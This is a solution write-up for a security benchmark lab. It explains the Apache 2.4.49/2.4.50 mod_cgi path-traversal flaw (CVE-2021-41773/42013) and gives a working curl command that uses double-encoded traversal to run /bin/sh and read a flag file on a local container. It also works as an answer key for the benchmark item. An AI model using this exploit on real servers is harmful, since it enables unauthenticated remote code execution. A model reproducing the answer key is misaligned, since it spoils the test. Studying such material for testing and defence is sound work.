# XBEN-031-24 — Apache CGI

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability class:** Path traversal + Remote Code Execution (CVE-2021-41773 / CVE-2021-42013 — Apache HTTP Server 2.4.49/2.4.50 `mod_cgi` path normalization bypass).

## Summary

The target runs a vulnerable Apache HTTP Server (2.4.49-class) with `cgi-bin` enabled and `Require all granted`/`ExecCGI` configured. Apache's path normalization for `%2e` (URL-encoded `.`) segments in the request path can be bypassed by double-encoding the `%` itself (`%%32%65` decodes in two passes to `%2e` then `.`), which defeats the `ap_unescape_url`/path-canonicalization check that would otherwise block `../` traversal. Requesting `/cgi-bin/.%%32%65/.%%32%65/.../bin/sh` therefore causes Apache to execute `/bin/sh` directly as a CGI script outside the `cgi-bin` directory, with the POST body delivered to it on stdin — full unauthenticated RCE as the web server user.

## Exploit

```bash
curl -s --path-as-is --noproxy '*' -X POST \
  "http://localhost:63638/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh" \
  -H "Content-Type: text/plain" \
  -d "echo Content-Type: text/plain; echo; cat /tmp/flag"
```

`--path-as-is` prevents curl itself from normalizing the `../`-style path before sending it. The POST body is a small shell script executed by `/bin/sh`: it first emits a `Content-Type` header (so Apache accepts the CGI response) followed by a blank line, then runs `cat /tmp/flag`, the path created by the benchmark Dockerfile.
